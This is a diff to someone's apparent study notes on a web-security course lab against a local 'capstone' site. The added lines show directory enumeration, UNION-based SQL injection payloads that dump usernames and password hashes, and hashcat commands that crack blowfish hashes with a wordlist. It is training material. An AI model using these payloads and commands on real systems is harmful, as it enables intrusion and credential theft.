@@ -2701,7 +2701,10 @@ we can automate this process and writing a script to find -->  all the admin acc
 - logged in
 
 ### Enumerate the website - Capstone
-`ffuf -u http://localhost/capstone/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -e .php -recursion`
+`dirb http://localhost/capstone/`
+![[Pasted image 20240310185234.png]]
+=>
+<span style="color:#00b050">we found a admin page </span>-->  http://localhost/capstone/admin/admin.php
 
 ### SQL Injection - Capstone
 - tested if there are potential SQL injection in the input
@@ -2732,6 +2735,32 @@ with 7 null it works:
 <span style="background:#fff88f">find tables:</span>
 `' union select null, TABLE_NAME,null, null, null, null, null FROM INFORMATION_SCHEMA.TABLES-- -`
 ![[Pasted image 20240310183431.png]]
+
+<span style="background:#fff88f">find columns of users table:</span>
+`' union select null, COLUMN_NAME,null, null, null, null, null FROM INFORMATION_SCHEMA.COLUMNS-- -`
+=>
+there are the columns -->  username and password
+<span style="background:#fff88f">find username and password:</span>
+`' union select null, username,password, null, null, null, null FROM users-- -`
+![[Pasted image 20240310183857.png]]
+
+#### Crack the passwords (hashcat)
+save into a file the jeremy and jessamy passwords
+
+<span style="background:#fff88f">find the hashtype:</span>
+[site](https://hashes.com/en/tools/hash_identifier)
+![[Pasted image 20240310184314.png]]
+=>
+it's a -->  blowfish hash
+=>
+search on google the blowfish mode for hashcat  (is 3200)
+=>
+`hashcat -m 3200 passwords.txt /home/simone/Desktop/TCM/wordlist/SecLists/Passwords/xato-net-10-million-passwords-10000.txt`
+<font color="#2DC26B">we found the jeremy password</font>
+![[Pasted image 20240310184927.png]]
+
+now:
+<span style="background:#fff88f">login with this credentials and try to access to the admin page that we found before:</span>
 
 ### XSS - Capstone
 when you login:
